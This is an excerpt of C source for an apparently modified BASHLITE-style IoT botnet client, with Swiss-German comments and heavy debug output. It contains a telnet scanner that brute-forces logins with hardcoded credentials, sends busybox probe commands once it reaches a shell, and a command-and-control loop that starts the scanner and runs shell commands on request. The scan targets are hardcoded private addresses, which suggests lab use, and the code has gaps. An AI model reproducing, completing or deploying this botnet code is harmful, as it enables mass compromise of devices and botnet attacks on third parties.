...
char *usernames[] = {"MalwareTwo\0" };
char *passwords[] = {"123\0"  };
int stillRunLelz = 1;
...
int matchPrompt(char *bufStr)
{
	...
	char *prompts = ":>%$#\0";
	//sockprintf(mainCommSock, "in matchPrompt function");
	...
	for(i = 0; i < strlen(prompts); i++)
	{
		while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) {
			q++;
			//sockprintf(mainCommSock, "q is increased");
			}
		//sockprintf(mainCommSock, "buStr: %s", bufStr);
		//sockprintf(mainCommSock, "bufLen: %d", bufLen);
		//sockprintf(mainCommSock, "q: %d", q);
		//sockprintf(mainCommSock, "bufst+buflen: %c", *(bufStr + bufLen - q));
		//sockprintf(mainCommSock, "prompts[i]: %c", prompts[i]);
...
//suecht es zweite argument im buffer
int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
	...
	while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
	{
		...
		//sockprintf(mainCommSock, " in readuntil function while");
		FD_ZERO(&myset);
		FD_SET(fd, &myset);
		if (select(fd+1, &myset, NULL, NULL, &tv) < 1) {
			//sockprintf(mainCommSock, "fd+1: %d", fd+1);
			//sockprintf(mainCommSock, "getRandomPublicIP called");
			//sockprintf(mainCommSock, "in readuntil function if that breaks");
			break;}
		//sockprintf(mainCommSock, "THIS IS THE fIRST GOAL");
		initialRead = buffer + bufferUsed;
		got = recv(fd, initialRead, 1, 0);
		//sockprintf(mainCommSock, "first got: %d", got);
		...
		if(*initialRead == 0xFF)
		{
			...
			//sockprintf(mainCommSock, "second got: %d", got);
			if(got == -1 || got == 0) return 0;
			bufferUsed += got;
			//sockprintf(mainCommSock, "bufferused: %d", bufferUsed);
...
in_addr_t getRandomPublicIP()
{
	...
	//return inet_addr(ip);
	//sockprintf(mainCommSock, "first IP returned");
	char* values[2] = {"192.168.1.23", "192.168.1.95"};
	srand(time(0));
	int index = rand() % 2;
	char* randomValue = values[index];
	return inet_addr(randomValue);
...
void StartTheLelz()
{
	sockprintf(mainCommSock, "StartTheLelz Function");
	...
	// telnet port vode destination adresse 
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	...
	while(stillRunLelz)
	{
		for(i = 0; i < max; i++)
		{
			...
			if(fds[i].complete == 1){
				//sockprintf(mainCommSock, "%d was finally completed", i);
				//sockprintf(mainCommSock, "ip %zu", fds[i].ip);
				//sockprintf(mainCommSock, "state %d", fds[i].state);
				//sockprintf(mainCommSock, "complete %d", fds[i].complete);
				//sockprintf(mainCommSock, "usernameInd %d", fds[i].usernameInd);
				//sockprintf(mainCommSock, "passwordInd %d", fds[i].passwordInd);
				//sockprintf(mainCommSock, "totalTimeout %d", fds[i].totalTimeout);
				//sockprintf(mainCommSock, "bufUsed %d", fds[i].bufUsed);
				//sockprintf(mainCommSock, "sockbuf: %s", fds[i].sockbuf);
				
				}
			
			//sleep(1);
			
			//sockprintf(mainCommSock, "\n \n TelnetScanner For %d", i);
			//sockprintf(mainCommSock, "Current State is: %d", fds[i].state);
			//de state vom fds isch d'variable vo 0, 1 etc chan sii
			switch(fds[i].state)
			{
			
			// wenn de state 0 isch
			case 0:
				{
					//sockprintf(mainCommSock, "Case 0");
					memset(fds[i].sockbuf, 0, 1024);
					
					//das isch ironischerwiis de ahfangscase
					if(fds[i].complete) { 
						char *tmp = fds[i].sockbuf; 
						memset(&(fds[i]), 0, 
						sizeof(struct telstate_t)); 
						fds[i].sockbuf = tmp; fds[i].ip = getRandomPublicIP(); }
					else {
						fds[i].passwordInd++;
					...
					//wener chönt connecte setzt er de state uf 1
			...
			case 1:
				{
					//sockprintf(mainCommSock, "Case 1");
			...
			case 2:
				{
					...
					if(readUntil(fds[i].fd, "ogin:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						...
						//sockprintf(mainCommSock, "ReadUntil else");
						fds[i].bufUsed = strlen(fds[i].sockbuf);
					}

					if(fds[i].totalTimeout + 30 < time(NULL))
					{
						//sockprintf(mainCommSock, "second Timeout if");
						sclose(fds[i].fd);
						fds[i].state = 0;
						fds[i].complete = 1;
					}
			...
			case 3:
				{
					//sockprintf(mainCommSock, "Case 3");
			...
			case 4:
				{
					//sockprintf(mainCommSock, "Case 4");
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
			...
			case 5:
				{
					//sockprintf(mainCommSock, "Case 5");
			...
			case 6:
				{
					//sockprintf(mainCommSock, "Case 6");
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

					if(readUntil(fds[i].fd, "ncorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						//sockprintf(mainCommSock, "readUntil case 6");
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						//falls ncorrect im sockbuf isch
						if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { 
							//sockprintf(mainCommSock, "sockbuf second %s lalelu",fds[i].sockbuf);
							memset(fds[i].sockbuf, 0, 1024); 
							sclose(fds[i].fd); fds[i].state = 0; 
							fds[i].complete = 0; 
							//sockprintf(mainCommSock, "ncorrect",i );
							continue; }
	 					...
	 					if(!matchPrompt(fds[i].sockbuf)) { 
							...
							fds[i].state = 0;
							fds[i].complete = 1;
							//sockprintf(mainCommSock, "%d failed \n",i );
			...
			case 7:
				{
					//sockprintf(mainCommSock, "Case 7");
			...
			case 8:
				{
					//sockprintf(mainCommSock, "Case 8");
			...
			case 9:
				{
					//sockprintf(mainCommSock, "Case 9");
					
					
					//das hani vo une une usegnoh
					if(exploitCount == 0)
					{
						exploitCount++;
					...
					if(readUntil(fds[i].fd, "bashlite", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						...
						// das isch di entscheidend ziile, do reportet er
			...
			case 100:
				{
					sockprintf(mainCommSock, "Case 110");
					if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 101;
				}
				break;
			...
			case 101:
				{
					sockprintf(mainCommSock, "Case 101");
					if(send(fds[i].fd, "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'\r\n", 49, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 102;
				}
				break;
			...
			case 102:
				{
					sockprintf(mainCommSock, "Case 102");
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
...
{
	sockprintf(mainCommSock, "argc: %d", argc);
	if(!strcmp(argv[0], "PING"))
	{
		sockprintf(mainCommSock, "PONG VOM CMD!");
		return;
	}
	...
	if(!strcmp(argv[0], "SCANNER"))
	{
		...
		if(!strcmp(argv[1], "OFF"))
		{
			if(scanPid == 0)
			{
				sockprintf(mainCommSock, "No Scanner");
				return;
				}

			sockprintf(mainCommSock, "Scanner should be turned off");
			kill(scanPid, 9);
			scanPid = 0;
		}
		...
		{
			if(scanPid != 0){ 
				sockprintf(mainCommSock, "Scanner cant be turned on, it is already running");
				return;
				}
			uint32_t parent;
			parent = fork();
			...
			sockprintf(mainCommSock, "Scanner should be started");
			StartTheLelz();
			_exit(0);
		}
	}
...
int main(int argc, unsigned char *argv[])
{
	...
	while(1)
	{
		...
		while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
		{
			...
			{
				sockprintf(mainCommSock, "PONG VOM MAIN");
				continue;
			}
			...
			//sockprintf(mainCommSock, "helloo");
			printf("hello");
			unsigned char *message = commBuf;
			//sockprintf(mainCommSock, "commbuf: %char", commBuf);
			//sockprintf(mainCommSock, "lululu mit sternli: %d", *message);
			//sockprintf(mainCommSock, "lululu ohni sternli: %d", message);
			//printf("lululu mit sternli: %d", *message);
			
			//printf("unsigned char: %c\n", message);
			
			//useneh
			//*message = '!';
			//sockprintf(mainCommSock, "lululu mit sternli es zweite: %d", *message);
			
			

			if(*message == '!')
			{
				//sockprintf(mainCommSock, "in ifffff \n");
				...
				*(nickMask) = 0x00;
				...
				//sockprintf(mainCommSock, "message in ifffff: %d \n", message);
				...
				*message = 0x00;
				...
				sockprintf(mainCommSock, "command: %d \n", command);
				
				while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
				
				if(strcmp(command, "SH") == 0)
				{
					sockprintf(mainCommSock, "SH called");
					printf("SH called");
